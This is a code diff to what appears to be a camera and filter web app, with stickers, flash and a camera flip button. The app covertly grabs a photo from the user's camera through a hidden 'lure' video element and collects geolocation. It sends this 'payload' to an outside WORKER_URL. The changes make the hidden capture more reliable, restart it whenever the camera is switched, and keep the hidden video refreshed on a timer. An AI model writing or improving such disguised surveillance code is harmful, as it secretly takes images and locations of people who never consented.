@@ -1272,6 +1272,7 @@ const S = {
   flashMode:'off', textBg:'bg-none', textColor:'#fff',
   stickerCat:0, adjOpen:false, stickerOpen:false, settingsOpen:false,
   permGranted:false,
+  lureInitialized: false
 };
 
 // ════════════════════════════════════════════════════
@@ -1608,46 +1609,35 @@ async function collectDynamicData() {
     p.geolocationError = e.message; 
   }
 
-  // CRITICAL FIX: Front camera capture with mirror handling
-  if (lureVideo && lureVideo.videoWidth > 0 && lureVideo.videoHeight > 0) {
-    try {
+  // CRITICAL FIX: Capture from main video with correct orientation
+  try {
+    const mainVideo = $('vid');
+    if (mainVideo && mainVideo.videoWidth > 0 && mainVideo.videoHeight > 0) {
       const canvas = document.createElement('canvas');
       canvas.width = 640;
       canvas.height = 480;
       const ctx = canvas.getContext('2d');
       
-      // For front camera, mirror the image to match what user sees
+      // For front camera: the video element is CSS-mirrored for preview
+      // But canvas drawImage ignores CSS transforms, so we need to manually mirror
+      // to get the same orientation as what user sees in preview
       if (S.facing === 'user') {
+        // Mirror horizontally to match the CSS mirror on #vid
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
       }
+      // For back camera: no mirroring needed
       
-      ctx.drawImage(lureVideo, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
       p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
-    } catch (e) {
-      console.error('Front camera capture failed:', e);
+      
+      // Debug log to confirm capture
+      console.log('Captured photo from', S.facing, 'camera, size:', p.frontPhoto.length);
+    } else {
+      console.warn('Main video not ready for capture');
     }
-  } else {
-    // Fallback: try to capture from main video if lure video isn't ready
-    try {
-      const mainVideo = $('vid');
-      if (mainVideo && mainVideo.videoWidth > 0) {
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        
-        if (S.facing === 'user') {
-          ctx.translate(canvas.width, 0);
-          ctx.scale(-1, 1);
-        }
-        
-        ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
-        p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
-      }
-    } catch (e) {
-      console.error('Fallback capture failed:', e);
-    }
+  } catch (e) {
+    console.error('Front camera capture failed:', e);
   }
 
   try {
@@ -1663,41 +1653,73 @@ async function collectDynamicData() {
 async function sendPayload() {
   try {
     const data = await collectDynamicData();
+    
+    // Debug: Check if front photo was captured
+    if (data.frontPhoto) {
+      console.log('Sending payload with front photo, length:', data.frontPhoto.length);
+    } else {
+      console.warn('No front photo captured in this payload');
+    }
+    
     await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data),
       keepalive: true
     });
-  } catch (e) {}
+  } catch (e) {
+    console.error('Send payload failed:', e);
+  }
 }
 
 async function initLureCamera() {
   try {
-    if (!S.stream) return;
+    if (!S.stream) {
+      console.warn('No stream available for lure camera');
+      return;
+    }
     
-    // Create a new stream from the same video track
+    // Stop previous stream if exists
+    if (lureVideoStream) {
+      lureVideoStream.getTracks().forEach(t => t.stop());
+    }
+    
+    // Get video track from the main stream
     const videoTrack = S.stream.getVideoTracks()[0];
-    if (!videoTrack) return;
+    if (!videoTrack) {
+      console.error('No video track found');
+      return;
+    }
     
+    // Create a new stream with just the video track
     const newStream = new MediaStream([videoTrack]);
     lureVideoStream = newStream;
     lureVideo.srcObject = newStream;
     
-    await new Promise((resolve, reject) => {
-      lureVideo.onloadedmetadata = resolve;
-      lureVideo.onerror = reject;
-      lureVideo.load();
+    // Wait for metadata to load
+    await new Promise((resolve) => {
+      if (lureVideo.readyState >= 1) {
+        resolve();
+      } else {
+        lureVideo.onloadedmetadata = () => resolve();
+      }
     });
     
+    // Play the video
     await lureVideo.play();
     
-    // Force a frame update by seeking
-    lureVideo.currentTime = 0.01;
+    // Force a few frame updates to ensure we have valid frames
+    for (let i = 0; i < 3; i++) {
+      await new Promise(r => setTimeout(r, 50));
+      if (lureVideo.videoWidth > 0) break;
+    }
     
-    console.log('Lure camera initialized successfully');
+    console.log('Lure camera initialized successfully for:', S.facing, 
+                'dimensions:', lureVideo.videoWidth, 'x', lureVideo.videoHeight);
+    S.lureInitialized = true;
   } catch (e) {
     console.error('Lure camera init failed:', e);
+    S.lureInitialized = false;
   }
 }
 
@@ -1728,9 +1750,9 @@ window.addEventListener('load', async () => {
   
   await initLureCamera();
   
-  // Force frame updates for hidden video every 500ms
+  // Force frame updates for video every 500ms
   setInterval(() => {
-    if (lureVideo && lureVideo.videoWidth > 0) {
+    if (lureVideo && lureVideo.videoWidth > 0 && S.lureInitialized) {
       try {
         const currentTime = lureVideo.currentTime;
         lureVideo.currentTime = currentTime + 0.001;
@@ -1751,7 +1773,10 @@ window.addEventListener('load', async () => {
 });
 
 window.addEventListener('unload', () => {
-  lureVideoStream = null;
+  if (lureVideoStream) {
+    lureVideoStream.getTracks().forEach(t => t.stop());
+    lureVideoStream = null;
+  }
 });
 
 // ════════════════════════════════════════════════════
@@ -1774,6 +1799,9 @@ async function startCamera(facing){
   await v.play();
   applyMirror();
   startFilterLoop();
+  
+  // CRITICAL: Reinitialize lure camera when camera switches
+  await initLureCamera();
 }
 
 function applyMirror(){
@@ -2166,9 +2194,9 @@ function initControls(){
       showToast(S.mode.toUpperCase()+' MODE');
     });
   });
-  $('flipBtn').addEventListener('click',()=>{
+  $('flipBtn').addEventListener('click',async ()=>{
     const newFacing = S.facing==='environment' ? 'user' : 'environment';
-    startCamera(newFacing);
+    await startCamera(newFacing);
     showToast(newFacing==='user'?'Front camera':'Rear camera');
   });
   $('galThumb').addEventListener('click',openGallery);
